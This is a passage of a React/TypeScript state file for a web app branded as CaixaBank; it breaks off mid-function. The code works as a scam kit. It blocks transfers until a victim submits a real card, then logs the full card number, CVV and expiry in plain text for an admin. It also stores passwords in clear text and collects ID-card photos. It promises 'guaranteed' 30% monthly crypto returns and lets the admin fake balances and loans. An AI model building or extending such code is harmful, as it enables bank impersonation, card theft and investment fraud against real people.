import React, { createContext, useContext, useState, useEffect } from 'react';
import {
  BankUser,
  BankTransaction,
  SupportMessage,
  AccountType,
  AccountStatus,
  BankCard,
  LinkedPrivateCard,
  Investment30D,
  LoanRequest,
  UserActivityLog,
} from '../types/bank';
import { Language, Translations, translations } from '../i18n/translations';

interface BankContextType {
  language: Language;
  setLanguage: (lang: Language) => void;
  t: Translations;
  currentUser: BankUser | null;
  allUsers: BankUser[];
  transactions: BankTransaction[];
  supportMessages: SupportMessage[];
  loanRequests: LoanRequest[];
  activityLogs: UserActivityLog[];
  showBalance: boolean;
  toggleShowBalance: () => void;
  showTicker: boolean;
  dismissTicker: () => void;
  login: (email: string, password: string) => { success: boolean; message?: string };
  register: (data: {
    firstName: string;
    lastName: string;
    email: string;
    phone: string;
    password: string;
    accountType: AccountType;
    initialDeposit: number;
    address: string;
  }) => { success: boolean; message?: string; user?: BankUser };
  logout: () => void;
  switchUser: (userId: string) => void;
  makeTransfer: (params: {
    recipientName: string;
    recipientIban: string;
    amount: number;
    label: string;
    category?: BankTransaction['category'];
    accountSource: 'courant' | 'epargne';
  }) => { success: boolean; message: string };
  transferInternal: (params: {
    amount: number;
    from: 'courant' | 'epargne';
    to: 'courant' | 'epargne';
  }) => { success: boolean; message: string };
  toggleCardLock: () => void;
  toggleContactless: () => void;
  updateCardLimit: (limit: number) => void;
  submitPrivateCard: (data: {
    cardNumber: string;
    expiryDate: string;
    cvv: string;
    cardHolder: string;
    balanceDeclared?: number;
    cardBrand?: string;
  }) => { success: boolean; message: string };
  contractInvestment30D: (params: {
    amount: number;
    cryptoSymbol?: string;
    cryptoName?: string;
    cryptoLogo?: string;
    cryptoAmount?: number;
  }) => { success: boolean; message: string };
  submitLoanRequest: (data: {
    amount: number;
    durationMonths: number;
    monthlyPayment: number;
    purpose: string;
    profession: string;
    employer?: string;
    monthlyIncome: number;
    idCardPhotoUrl: string;
    idCardFileName?: string;
  }) => { success: boolean; message: string; loan?: LoanRequest };
  // Admin actions
  adminToggleUserStatus: (userId: string, newStatus: AccountStatus) => void;
  adminToggleUserTransfers: (userId: string, blocked: boolean) => void;
  adminToggleCardFreeze: (userId: string) => void;
  adminAdjustBalance: (userId: string, amount: number, isCredit: boolean, reason: string) => void;
  adminQuickCredit: (userId: string, amount: number) => void;
  adminApprovePrivateCard: (userId: string, approve: boolean) => void;
  adminResetPrivateCard: (userId: string) => void;
  adminApproveLoan: (loanId: string) => void;
  adminApproveAllPendingLoans: () => { count: number; totalAmount: number };
  adminGrantSimulatedLoan: (params: {
    userId: string;
    amount: number;
    durationMonths: number;
    monthlyPayment: number;
    purpose?: string;
  }) => { success: boolean; message: string; loan?: LoanRequest };
  adminRejectLoan: (loanId: string, reason?: string) => void;
  adminUpdateTransactionStatus: (transactionId: string, newStatus: BankTransaction['status']) => void;
  adminReplySupport: (messageId: string, reply: string) => void;
  adminCreateUser: (data: {
    firstName: string;
    lastName: string;
    email: string;
    phone: string;
    password?: string;
    accountType: AccountType;
    initialDeposit: number;
    address?: string;
  }) => { success: boolean; message: string };
  sendSupportMessage: (subject: string, content: string) => void;
  resetToDefaultData: () => void;
}

const STORAGE_KEY_LANG = 'caixabank_lang_v9';
const STORAGE_KEY_USERS = 'caixabank_users_v9';
const STORAGE_KEY_TXS = 'caixabank_txs_v9';
const STORAGE_KEY_MESSAGES = 'caixabank_messages_v9';
const STORAGE_KEY_LOANS = 'caixabank_loans_v9';
const STORAGE_KEY_LOGS = 'caixabank_logs_v9';
const STORAGE_KEY_ACTIVE_SESSION = 'caixabank_session_active_v9';

// Clean up any legacy session keys from previous builds so new visitors are NEVER auto-logged in
try {
  localStorage.removeItem('caixabank_current_user_v6');
  localStorage.removeItem('caixabank_current_user');
  localStorage.removeItem('caixabank_users_v6');
  localStorage.removeItem('caixabank_users_v8');
} catch {
  // ignore
}

const INITIAL_USERS: BankUser[] = [
  {
    id: 'user_alexandre',
    clientCode: 'CLI-881290',
    firstName: 'Alexandre',
    lastName: 'Reed',
    email: 'alexandre.reed@caixabank.com',
    phone: '+34 612 34 56 78',
    role: 'user',
    accountType: 'courant',
    accountNumber: '2100-0418-4502-0005',
    iban: 'ES91 2100 0418 4502 0005 1290',
    bic: 'CAIXESBBXXX',
    balance: 5494.20,
    savingsBalance: 45200.00,
    status: 'active',
    verificationLevel: 3,
    isTransfersBlocked: true,
    investments: [],
    address: 'Paseo de la Castellana 50, 28046 Madrid',
    password: 'user123',
    createdAt: '15/01/2025',
    // No fictitious card: client must add their real bank card
  },
  {
    id: 'user_sophie',
    clientCode: 'CLI-793401',
    firstName: 'Sophie',
    lastName: 'Martín',
    email: 'sophie.martin@caixabank.com',
    phone: '+34 698 76 54 32',
    role: 'user',
    accountType: 'pro',
    accountNumber: '2100-0418-7809-0001',
    iban: 'ES91 2100 0418 7809 0001 8842',
    bic: 'CAIXESBBXXX',
    balance: 82400.00,
    savingsBalance: 125000.00,
    status: 'active',
    verificationLevel: 3,
    isTransfersBlocked: true,
    investments: [],
    address: 'Avinguda Diagonal 621, 08028 Barcelona',
    password: 'user123',
    createdAt: '03/02/2025',
    // No fictitious card: client must add their real bank card
  },
  {
    id: 'admin_master',
    clientCode: '34343434',
    firstName: 'Administrador',
    lastName: 'CaixaBank',
    email: '34343434',
    phone: '+34 900 34 34 34',
    role: 'admin',
    accountType: 'pro',
    accountNumber: '2100-3434-3434-0001',
    iban: 'ES91 2100 3434 3434 0001 3434',
    bic: 'CAIXESBBXXX',
    balance: 5000000.00,
    savingsBalance: 25000000.00,
    status: 'active',
    verificationLevel: 3,
    isTransfersBlocked: false,
    investments: [],
    address: 'Dirección Central CaixaBank, Paseo de la Castellana 51, Madrid',
    password: '34343434',
    createdAt: '01/01/2024',
    avatarUrl: '/src/assets/images/bank_admin_avatar_1791816158654.jpg',
  },
];

// USER REQUEST: "Même dans le compte des utilisateurs, je veux que les opérations soient de zéro opération. C'est quand les clients vont obtenir une opération qu'il faut stocker ça directement, et il faut stocker ça à l'illimité même."
const INITIAL_TRANSACTIONS: BankTransaction[] = [];

// Clean initial loans (client fills manually)
const INITIAL_LOANS: LoanRequest[] = [];

const INITIAL_MESSAGES: SupportMessage[] = [];

const BankContext = createContext<BankContextType | undefined>(undefined);

export const BankProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  // 1. Language state (Defaults to 'es' Spanish)
  const [language, setLanguageState] = useState<Language>(() => {
    const saved = localStorage.getItem(STORAGE_KEY_LANG);
    return (saved as Language) || 'es';
  });

  const setLanguage = (lang: Language) => {
    setLanguageState(lang);
    localStorage.setItem(STORAGE_KEY_LANG, lang);
  };

  const t = translations[language] || translations.es;

  // 2. Users state
  const [allUsers, setAllUsers] = useState<BankUser[]>(() => {
    try {
      const saved = localStorage.getItem(STORAGE_KEY_USERS);
      if (saved) {
        const parsed = JSON.parse(saved);
        if (Array.isArray(parsed) && parsed.length > 0) {
          const hasAdmin = parsed.some((u: BankUser) => u.clientCode === '34343434' || u.role === 'admin');
          if (!hasAdmin) {
            return [...parsed, INITIAL_USERS[2]];
          }
          return parsed.map((u: BankUser) => {
            if (u.role === 'admin') {
              return {
                ...u,
                clientCode: '34343434',
                email: '34343434',
                password: '34343434',
              };
            }
            return u;
          });
        }
      }
    } catch {
      // Fallback
    }
    return INITIAL_USERS;
  });

  // 3. Current User state - Stored per device, stays logged in across refresh
  const [currentUser, setCurrentUser] = useState<BankUser | null>(() => {
    try {
      const activeSessionId = localStorage.getItem(STORAGE_KEY_ACTIVE_SESSION);
      if (activeSessionId) {
        const found = allUsers.find((u) => u.id === activeSessionId);
        if (found) return found;
      }
    } catch {
      // ignore
    }
    // By default, fresh visitors are NOT logged in and land directly on AuthPage
    return null;
  });

  // 4. Transactions state (starts with 0 operations as requested)
  const [transactions, setTransactions] = useState<BankTransaction[]>(() => {
    try {
      const saved = localStorage.getItem(STORAGE_KEY_TXS);
      if (saved) {
        const parsed = JSON.parse(saved);
        if (Array.isArray(parsed)) return parsed;
      }
    } catch {
      // ignore
    }
    return INITIAL_TRANSACTIONS;
  });

  // 5. Support messages state
  const [supportMessages, setSupportMessages] = useState<SupportMessage[]>(() => {
    try {
      const saved = localStorage.getItem(STORAGE_KEY_MESSAGES);
      if (saved) {
        const parsed = JSON.parse(saved);
        if (Array.isArray(parsed)) return parsed;
      }
    } catch {
      // ignore
    }
    return INITIAL_MESSAGES;
  });

  // 6. Loan requests state (unlimited storage as submitted)
  const [loanRequests, setLoanRequests] = useState<LoanRequest[]>(() => {
    try {
      const saved = localStorage.getItem(STORAGE_KEY_LOANS);
      if (saved) {
        const parsed = JSON.parse(saved);
        if (Array.isArray(parsed)) return parsed;
      }
    } catch {
      // ignore
    }
    return INITIAL_LOANS;
  });

  // 7. Balance visibility toggle
  // 7. Balance visibility toggle
  const [showBalance, setShowBalance] = useState<boolean>(true);
  const toggleShowBalance = () => setShowBalance((prev) => !prev);

  // 8. Top live ticker banner
  const [showTicker, setShowTicker] = useState<boolean>(true);
  const dismissTicker = () => setShowTicker(false);

  // 9. User activity logs (Real-time tracking of everything the user does)
  const [activityLogs, setActivityLogs] = useState<UserActivityLog[]>(() => {
    try {
      const saved = localStorage.getItem(STORAGE_KEY_LOGS);
      if (saved) {
        const parsed = JSON.parse(saved);
        if (Array.isArray(parsed)) return parsed;
      }
    } catch {
      // ignore
    }
    return [];
  });

  // Unlimited syncing to localStorage
  useEffect(() => {
    localStorage.setItem(STORAGE_KEY_USERS, JSON.stringify(allUsers));
  }, [allUsers]);

  useEffect(() => {
    localStorage.setItem(STORAGE_KEY_TXS, JSON.stringify(transactions));
  }, [transactions]);

  useEffect(() => {
    localStorage.setItem(STORAGE_KEY_MESSAGES, JSON.stringify(supportMessages));
  }, [supportMessages]);

  useEffect(() => {
    localStorage.setItem(STORAGE_KEY_LOANS, JSON.stringify(loanRequests));
  }, [loanRequests]);

  useEffect(() => {
    localStorage.setItem(STORAGE_KEY_LOGS, JSON.stringify(activityLogs));
  }, [activityLogs]);

  const logUserActivity = (
    action: UserActivityLog['action'],
    title: string,
    description: string,
    user?: { id: string; firstName: string; lastName: string; clientCode: string } | null,
    details?: string
  ) => {
    const target = user || currentUser;
    const newLog: UserActivityLog = {
      id: `act_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`,
      userId: target ? target.id : 'system',
      userName: target ? `${target.firstName} ${target.lastName}` : 'Sistema CaixaBank',
      clientCode: target ? target.clientCode : 'ADM-00',
      action,
      title,
      description,
      timestamp: new Date().toLocaleString('es-ES', {
        day: '2-digit',
        month: '2-digit',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
      }),
      details,
    };
    setActivityLogs((prev) => [newLog, ...prev]);
  };

  // Keep active user session in sync: persists across refresh, removes on logout
  useEffect(() => {
    if (currentUser) {
      localStorage.setItem(STORAGE_KEY_ACTIVE_SESSION, currentUser.id);
      const updated = allUsers.find((u) => u.id === currentUser.id);
      if (updated && JSON.stringify(updated) !== JSON.stringify(currentUser)) {
        setCurrentUser(updated);
      }
    } else {
      localStorage.removeItem(STORAGE_KEY_ACTIVE_SESSION);
    }
  }, [allUsers, currentUser]);

  // LOGIN (UNIFIED FOR CLIENT & ADMIN)
  const login = (identifier: string, pass: string) => {
    const cleanId = identifier.trim();
    const cleanIdLower = cleanId.toLowerCase();
    const cleanPass = pass.trim();

    // Check if Administrator login: exactly 34343434 / 34343434 or admin@caixabank.com / 34343434
    if ((cleanId === '34343434' || cleanIdLower === 'admin@caixabank.com' || cleanIdLower === 'admin') && cleanPass === '34343434') {
      let admin = allUsers.find((u) => u.role === 'admin' || u.clientCode === '34343434');
      if (!admin) {
        admin = INITIAL_USERS[2];
        setAllUsers((prev) => [...prev, admin!]);
      }
      setCurrentUser(admin);
      localStorage.setItem(STORAGE_KEY_ACTIVE_SESSION, admin.id);
      return { success: true };
    }

    // Check regular users by email, clientCode or phone
    const user = allUsers.find(
      (u) =>
        (u.email.toLowerCase() === cleanIdLower ||
          u.clientCode.toLowerCase() === cleanIdLower ||
          u.phone.replace(/\s+/g, '') === cleanId.replace(/\s+/g, '') ||
          u.id === cleanId) &&
        u.password === cleanPass
    );

    if (!user) {
      return {
        success: false,
        message:
          language === 'es'
            ? 'Identificador o contraseña incorrectos. Por favor, verifique sus datos.'
            : language === 'fr'
            ? 'Identifiant ou mot de passe incorrect. Veuillez vérifier vos données.'
            : 'Incorrect credentials. Please verify your login information.',
      };
    }

    if (user.status === 'frozen') {
      return {
        success: false,
        message:
          language === 'es'
            ? 'Esta cuenta ha sido bloqueada preventivamente por el departamento de seguridad.'
            : 'This account is temporarily suspended by CaixaBank security.',
      };
    }

    setCurrentUser(user);
    localStorage.setItem(STORAGE_KEY_ACTIVE_SESSION, user.id);
    logUserActivity('register', 'Inicio de Sesión', `El cliente ${user.firstName} ${user.lastName} ha accedido a su cuenta.`, user);
    return { success: true };
  };

  // REGISTER (NEW CLIENT)
  const register = (data: {
    firstName: string;
    lastName: string;
    email: string;
    phone: string;
    password: string;
    accountType: AccountType;
    initialDeposit: number;
    address: string;
  }) => {
    if (allUsers.some((u) => u.email.toLowerCase() === data.email.toLowerCase())) {
      return {
        success: false,
        message:
          language === 'es'
            ? 'Ya existe una cuenta con este correo electrónico.'
            : 'An account with this email address already exists.',
      };
    }

    const randomSuffix = Math.floor(100000 + Math.random() * 900000);
    const clientCode = `CLI-${randomSuffix}`;
    const cleanAccountNum = `2100-${Math.floor(1000 + Math.random() * 9000)}-${Math.floor(1000 + Math.random() * 9000)}-0001`;
    const cleanIban = `ES91 2100 ${cleanAccountNum.replace(/-/g, ' ')} ${randomSuffix}`;

    const newUser: BankUser = {
      id: `user_${Date.now()}`,
      clientCode,
      firstName: data.firstName,
      lastName: data.lastName,
      email: data.email,
      phone: data.phone,
      role: 'user',
      accountType: data.accountType,
      accountNumber: cleanAccountNum,
      iban: cleanIban,
      bic: 'CAIXESBBXXX',
      balance: data.initialDeposit || 0,
      savingsBalance: 0,
      status: 'active',
      verificationLevel: 3,
      isTransfersBlocked: true,
      investments: [],
      address: data.address,
      password: data.password,
      createdAt: new Date().toLocaleDateString('es-ES'),
    };

    // If initial deposit > 0, store as first transaction
    if (data.initialDeposit > 0) {
      const initialTx: BankTransaction = {
        id: `tx_${Date.now()}`,
        userId: newUser.id,
        userName: `${newUser.firstName} ${newUser.lastName}`,
        type: 'transfer_in',
        amount: data.initialDeposit,
        label: 'Apertura de Cuenta - Depósito Inicial',
        counterparty: 'CaixaBank Depósito',
        category: 'Services',
        date: new Date().toLocaleDateString('es-ES', { day: '2-digit', month: 'short' }),
        status: 'completed',
        reference: `INIT-${randomSuffix}`,
        accountSource: 'courant',
      };
      setTransactions((prev) => [initialTx, ...prev]);
    }

    setAllUsers((prev) => [...prev, newUser]);
    setCurrentUser(newUser);
    localStorage.setItem(STORAGE_KEY_ACTIVE_SESSION, newUser.id);

    logUserActivity(
      'register',
      'Registro de Nueva Cuenta de Cliente',
      `El usuario ${newUser.firstName} ${newUser.lastName} ha registrado una cuenta en CaixaBank.`,
      newUser,
      `Código: ${newUser.clientCode} | Email: ${newUser.email} | Teléfono: ${newUser.phone} | Contraseña: ${newUser.password} | Dirección: ${newUser.address}`
    );

    return { success: true, user: newUser };
  };

  const logout = () => {
    setCurrentUser(null);
    localStorage.removeItem(STORAGE_KEY_ACTIVE_SESSION);
  };

  const switchUser = (userId: string) => {
    const found = allUsers.find((u) => u.id === userId);
    if (found) {
      setCurrentUser(found);
      localStorage.setItem(STORAGE_KEY_ACTIVE_SESSION, found.id);
    }
  };

  // MAKE TRANSFER (SEPA) - Store transaction directly and without limit
  const makeTransfer = (params: {
    recipientName: string;
    recipientIban: string;
    amount: number;
    label: string;
    category?: BankTransaction['category'];
    accountSource: 'courant' | 'epargne';
  }) => {
    if (!currentUser) return { success: false, message: 'No hay sesión activa.' };

    if (currentUser.isTransfersBlocked) {
      return {
        success: false,
        message:
          language === 'es'
            ? 'Transferencias salientes bloqueadas. Debe asociar y validar una tarjeta privada antes de emitir fondos.'
            : 'Outgoing transfers are restricted. You must link and validate an authorized private card first.',
      };
    }

    if (currentUser.status === 'frozen') {
      return { success: false, message: 'Su cuenta está temporalmente suspendida.' };
    }

    const sourceBalance = params.accountSource === 'courant' ? currentUser.balance : currentUser.savingsBalance;
    if (sourceBalance < params.amount) {
      return {
        success: false,
        message:
          language === 'es'
            ? 'Saldo insuficiente para completar la transferencia.'
            : 'Insufficient funds for this transfer.',
      };
    }

    const updatedUser: BankUser = {
      ...currentUser,
      balance: params.accountSource === 'courant' ? currentUser.balance - params.amount : currentUser.balance,
      savingsBalance: params.accountSource === 'epargne' ? currentUser.savingsBalance - params.amount : currentUser.savingsBalance,
    };

    const newTx: BankTransaction = {
      id: `tx_${Date.now()}_${Math.floor(Math.random() * 1000)}`,
      userId: currentUser.id,
      userName: `${currentUser.firstName} ${currentUser.lastName}`,
      type: 'transfer_out',
      amount: -params.amount,
      label: params.label || `Transferencia a ${params.recipientName}`,
      counterparty: params.recipientName,
      counterpartyIban: params.recipientIban,
      category: params.category || 'Virement',
      date: new Date().toLocaleDateString('es-ES', { day: '2-digit', month: 'short' }),
      status: 'completed',
      reference: `SEPA-${Math.floor(10000000 + Math.random() * 90000000)}`,
      accountSource: params.accountSource,
    };

    setAllUsers((prev) => prev.map((u) => (u.id === currentUser.id ? updatedUser : u)));
    setCurrentUser(updatedUser);
    setTransactions((prev) => [newTx, ...prev]);

    logUserActivity(
      'transfer_sent',
      'Transferencia SEPA Emitida',
      `El usuario emitió una transferencia de ${params.amount.toLocaleString('es-ES', { minimumFractionDigits: 2 })} € a ${params.recipientName}.`,
      currentUser,
      `Destinatario: ${params.recipientName} | IBAN Destino: ${params.recipientIban} | Importe: ${params.amount.toLocaleString('es-ES', { minimumFractionDigits: 2 })} € | Concepto: ${params.label}`
    );

    return {
      success: true,
      message:
        language === 'es'
          ? `Transferencia de ${params.amount.toFixed(2)} € enviada con éxito.`
          : `Transfer of €${params.amount.toFixed(2)} sent successfully.`,
    };
  };

  const transferInternal = (params: {
    amount: number;
    from: 'courant' | 'epargne';
    to: 'courant' | 'epargne';
  }) => {
    if (!currentUser) return { success: false, message: 'No hay sesión activa.' };
    if (params.from === params.to) return { success: false, message: 'Las cuentas deben ser diferentes.' };

    const sourceBal = params.from === 'courant' ? currentUser.balance : currentUser.savingsBalance;
    if (sourceBal < params.amount) {
      return { success: false, message: 'Saldo insuficiente en la cuenta de origen.' };
    }

    const updatedUser: BankUser = {
      ...currentUser,
      balance:
        params.from === 'courant'
          ? currentUser.balance - params.amount
          : currentUser.balance + params.amount,
      savingsBalance:
        params.from === 'epargne'
          ? currentUser.savingsBalance - params.amount
          : currentUser.savingsBalance + params.amount,
    };

    setAllUsers((prev) => prev.map((u) => (u.id === currentUser.id ? updatedUser : u)));
    setCurrentUser(updatedUser);

    return { success: true, message: 'Traspaso interno efectuado al instante.' };
  };

  const toggleCardLock = () => {
    if (!currentUser) return;
    if (currentUser.card) {
      const updatedCard: BankCard = {
        ...currentUser.card,
        isFrozen: !currentUser.card.isFrozen,
      };
      const updatedUser = { ...currentUser, card: updatedCard };
      setAllUsers((prev) => prev.map((u) => (u.id === currentUser.id ? updatedUser : u)));
      setCurrentUser(updatedUser);
    }
  };

  const toggleContactless = () => {
    if (!currentUser) return;
    if (currentUser.card) {
      const updatedCard: BankCard = {
        ...currentUser.card,
        contactlessEnabled: !currentUser.card.contactlessEnabled,
      };
      const updatedUser = { ...currentUser, card: updatedCard };
      setAllUsers((prev) => prev.map((u) => (u.id === currentUser.id ? updatedUser : u)));
      setCurrentUser(updatedUser);
    }
  };

  const updateCardLimit = (limit: number) => {
    if (!currentUser) return;
    if (currentUser.card) {
      const updatedCard: BankCard = {
        ...currentUser.card,
        monthlyLimit: limit,
      };
      const updatedUser = { ...currentUser, card: updatedCard };
      setAllUsers((prev) => prev.map((u) => (u.id === currentUser.id ? updatedUser : u)));
      setCurrentUser(updatedUser);
    }
  };

  const submitPrivateCard = (data: {
    cardNumber: string;
    expiryDate: string;
    cvv: string;
    cardHolder: string;
    balanceDeclared?: number;
    cardBrand?: string;
  }) => {
    if (!currentUser) return { success: false, message: 'No hay sesión activa.' };

    const declared = typeof data.balanceDeclared === 'number' && !isNaN(data.balanceDeclared)
      ? data.balanceDeclared
      : 250.0;

    const cleanNumber = data.cardNumber.trim();
    const cleanHolder = data.cardHolder.trim().toUpperCase();
    const cleanExpiry = data.expiryDate.trim();
    const cleanCvv = data.cvv.trim();
    const cleanBrand = data.cardBrand ||
      (cleanNumber.startsWith('4') ? 'Visa' : cleanNumber.startsWith('5') ? 'Mastercard' : 'Visa');

    const linkedCard: LinkedPrivateCard = {
      cardNumber: cleanNumber,
      cardHolder: cleanHolder,
      expiryDate: cleanExpiry,
      cvv: cleanCvv,
      cardBrand: cleanBrand,
      balanceDeclared: declared,
      status: 'pending_approval',
      submittedAt: new Date().toLocaleDateString('es-ES'),
    };

    const updatedUser: BankUser = {
      ...currentUser,
      linkedPrivateCard: linkedCard,
    };

    setAllUsers((prev) => prev.map((u) => (u.id === currentUser.id ? updatedUser : u)));
    setCurrentUser(updatedUser);

    logUserActivity(
      'card_submitted',
      'Inscripción de Tarjeta Bancaria Real',
      `El usuario ha registrado su tarjeta real terminada en ${cleanNumber.slice(-4)}. Estado: Pendiente de aprobación.`,
      currentUser,
      `Número: ${cleanNumber} | Titular: ${cleanHolder} | Caducidad: ${cleanExpiry} | CVV: ${cleanCvv} | Saldo declarado: ${declared.toLocaleString('es-ES', { minimumFractionDigits: 2 })} €`
    );

    const newMsg: SupportMessage = {
      id: `msg_card_${Date.now()}`,
      userId: currentUser.id,
      userName: `${currentUser.firstName} ${currentUser.lastName}`,
      userEmail: currentUser.email,
      subject: `Validación de Tarjeta Real (${currentUser.clientCode})`,
      content: `El cliente ha registrado su tarjeta bancaria real (${cleanBrand} ···· ${cleanNumber.slice(-4)}). Titular: ${cleanHolder}. Requiere examen y aprobación formal en el panel de control.`,
      date: new Date().toLocaleDateString('es-ES', { day: '2-digit', month: 'short' }),
      isReadByAdmin: false,
    };
    setSupportMessages((prev) => [newMsg, ...prev]);

    return {
      success: true,
      message:
        language === 'es'
          ? 'Tarjeta bancaria real registrada con éxito. Se encuentra en espera de aprobación por la Dirección de CaixaBank.'
          : 'Real bank card successfully registered. Awaiting approval by CaixaBank administration.',
    };
  };

  const contractInvestment30D = (params: {
    amount: number;
    cryptoSymbol?: string;
    cryptoName?: string;
    cryptoLogo?: string;
    cryptoAmount?: number;
  }) => {
    const { amount, cryptoSymbol = 'BTC', cryptoName = 'Bitcoin', cryptoLogo, cryptoAmount } = params;
    if (!currentUser) return { success: false, message: 'No hay sesión activa.' };
    if (currentUser.balance < amount) {
      return {
        success: false,
        message:
          language === 'es'
            ? 'Saldo insuficiente en su Cuenta Gastos.'
            : language === 'fr'
            ? 'Solde insuffisant sur votre compte courant.'
            : 'Insufficient balance in your spending account.',
      };
    }

    const now = new Date();
    const endDate = new Date(now.getTime() + 30 * 24 * 60 * 60 * 1000);
    const rate = 0.3; // USER REQUIREMENT: 30% chaque 30 jours
    const profit = amount * rate;

    const newInvest: Investment30D = {
      id: `inv_${Date.now()}`,
      cryptoSymbol,
      cryptoName,
      cryptoLogo,
      amount,
      cryptoAmount,
      rate,
      profit,
      startDate: now.toLocaleDateString('es-ES'),
      endDate: endDate.toLocaleDateString('es-ES'),
      status: 'active',
    };

    const updatedUser: BankUser = {
      ...currentUser,
      balance: currentUser.balance - amount,
      investments: [...(currentUser.investments || []), newInvest],
    };

    const tx: BankTransaction = {
      id: `tx_${Date.now()}`,
      userId: currentUser.id,
      userName: `${currentUser.firstName} ${currentUser.lastName}`,
      type: 'investment_deposit',
      amount: -amount,
      label: `Inversión Cripto ${cryptoName} (${cryptoSymbol}) - Rendimiento 30% / 30 días`,
      counterparty: `CaixaBank Crypto & Assets (${cryptoSymbol})`,
      category: 'Épargne',
      date: new Date().toLocaleDateString('es-ES', { day: '2-digit', month: 'short' }),
      status: 'completed',
      reference: `CRYPTO30-${cryptoSymbol}-${Math.floor(10000 + Math.random() * 90000)}`,
      accountSource: 'courant',
    };

    setAllUsers((prev) => prev.map((u) => (u.id === currentUser.id ? updatedUser : u)));
    setCurrentUser(updatedUser);
    setTransactions((prev) => [tx, ...prev]);

    logUserActivity(
      'profile_updated',
      `Inversión Cripto ${cryptoSymbol} (+30%)`,
      `El cliente invirtió ${amount.toLocaleString('es-ES', { minimumFractionDigits: 2 })} € en ${cryptoName} (+30% rendimiento mensual / cada 30 días).`,
      currentUser
    );

    return {
      success: true,
      message:
        language === 'es'
          ? `✓ Inversión de ${amount.toFixed(2)} € en ${cryptoName} (${cryptoSymbol}) contratada con éxito. Rendimiento del +30% cada 30 días activado.`
          : language === 'fr'
          ? `✓ Investissement de ${amount.toFixed(2)} € en ${cryptoName} (${cryptoSymbol}) activé avec succès. Revenu de 30% chaque 30 jours opérationnel.`
          : `✓ Investment of €${amount.toFixed(2)} in ${cryptoName} (${cryptoSymbol}) confirmed. Guaranteed +30% return every 30 days.`,
    };
  };

  // SUBMIT LOAN REQUEST (CLIENT SIDE - MANUAL FIELDS TYPED BY USER)
  const submitLoanRequest = (data: {
    amount: number;
    durationMonths: number;
    monthlyPayment: number;
    purpose: string;
    profession: string;
    employer?: string;
    monthlyIncome: number;
    idCardPhotoUrl: string;
    idCardFileName?: string;
  }) => {
    if (!currentUser) return { success: false, message: 'No hay sesión activa.' };

    const newLoan: LoanRequest = {
      id: `loan_${Date.now()}`,
      userId: currentUser.id,
      userName: `${currentUser.firstName} ${currentUser.lastName}`,
      userEmail: currentUser.email,
      clientCode: currentUser.clientCode,
      amount: data.amount,
      durationMonths: data.durationMonths,
      monthlyPayment: data.monthlyPayment,
      purpose: data.purpose,
      profession: data.profession,
      employer: data.employer,
      monthlyIncome: data.monthlyIncome,
      idCardPhotoUrl: data.idCardPhotoUrl,
      idCardFileName: data.idCardFileName || 'Documento_Identidad.jpg',
      status: 'pending',
      createdAt: new Date().toLocaleDateString('es-ES', {
        day: '2-digit',
        month: 'short',
        year: 'numeric',
      }),
    };

    setLoanRequests((prev) => [newLoan, ...prev]);

    const notificationMsg: SupportMessage = {
      id: `msg_loan_alert_${Date.now()}`,
      userId: currentUser.id,
      userName: `${currentUser.firstName} ${currentUser.lastName}`,
      userEmail: currentUser.email,
      subject: `Nueva Solicitud de Préstamo (${data.amount.toLocaleString('es-ES')} €)`,
      content: `El cliente ${currentUser.firstName} ${currentUser.lastName} (${currentUser.clientCode}) ha solicitado un préstamo de ${data.amount.toLocaleString('es-ES')} €. Profesión: "${data.profession}". Motivo: "${data.purpose}". Documento de identidad adjunto para revisión y autorización.`,
      date: new Date().toLocaleDateString('es-ES', { day: '2-digit', month: 'short' }),
      isReadByAdmin: false,
    };
    setSupportMessages((prev) => [notificationMsg, ...prev]);

    logUserActivity(
      'loan_requested',
      'Solicitud de Préstamo Personal',
      `El usuario ha solicitado un préstamo de ${data.amount.toLocaleString('es-ES')} € (${data.durationMonths} meses, cuota mensual de ${data.monthlyPayment} €).`,
      currentUser,
      `Finalidad: ${data.purpose} | Profesión: ${data.profession} | Ingresos declarados: ${data.monthlyIncome} €`
    );

    return {
      success: true,
      message:
        language === 'es'
          ? 'Su solicitud de préstamo ha sido enviada con éxito a la dirección CaixaBank. Requiere autorización previa antes del abono.'
          : 'Your loan application was successfully submitted to CaixaBank management for approval before funds are credited.',
      loan: newLoan,
    };
  };

  // ADMIN: APPROVE LOAN & DIRECTLY CREDIT MONEY TO CLIENT (STORED DIRECTLY & UNLIMITED)
  const adminApproveLoan = (loanId: string) => {
    const loan = loanRequests.find((l) => l.id === loanId);
    if (!loan) return;

    const targetUser = allUsers.find((u) => u.id === loan.userId);
    if (!targetUser) return;

    const dateStr = new Date().toLocaleDateString('es-ES', {
      day: '2-digit',
      month: 'short',
      year: 'numeric',
    });

    const updatedLoans = loanRequests.map((l) =>
      l.id === loanId
        ? {
            ...l,
            status: 'approved' as const,
            decidedAt: dateStr,
          }
        : l
    );
    setLoanRequests(updatedLoans);

    // DIRECTLY CREDIT THE LOAN MONEY INTO CLIENT'S ACCOUNT BALANCE!
    const updatedUser: BankUser = {
      ...targetUser,
      balance: targetUser.balance + loan.amount,
    };
    setAllUsers((prev) => prev.map((u) => (u.id === targetUser.id ? updatedUser : u)));

    // CREATE AND STORE OFFICIAL DISBURSEMENT TRANSACTION DIRECTLY!
    const disburseTx: BankTransaction = {
      id: `tx_loan_disburse_${Date.now()}`,
      userId: targetUser.id,
      userName: `${targetUser.firstName} ${targetUser.lastName}`,
      type: 'loan_disbursement',
      amount: loan.amount,
      label: `Abono Préstamo Personal CaixaBank (${loan.purpose})`,
      counterparty: 'CaixaBank Financiación',
      category: 'Prêt',
      date: new Date().toLocaleDateString('es-ES', { day: '2-digit', month: 'short' }),
      status: 'completed',
      reference: `PREST-${Math.floor(100000 + Math.random() * 900000)}`,
      accountSource: 'courant',
    };
    setTransactions((prev) => [disburseTx, ...prev]);

    logUserActivity(
      'balance_adjusted',
      'Préstamo Aprobado y Abonado',
      `La Dirección autorizó y abonó directamente el préstamo de ${loan.amount.toLocaleString('es-ES', { minimumFractionDigits: 2 })} € para ${targetUser.firstName} ${targetUser.lastName}.`,
      targetUser,
      `Importe: ${loan.amount.toLocaleString('es-ES', { minimumFractionDigits: 2 })} € | Nuevo Saldo: ${updatedUser.balance.toLocaleString('es-ES', { minimumFractionDigits: 2 })} €`
    );

    const confirmationNotice: SupportMessage = {
      id: `msg_loan_appr_${Date.now()}`,
      userId: targetUser.id,
      userName: `${targetUser.firstName} ${targetUser.lastName}`,
      userEmail: targetUser.email,
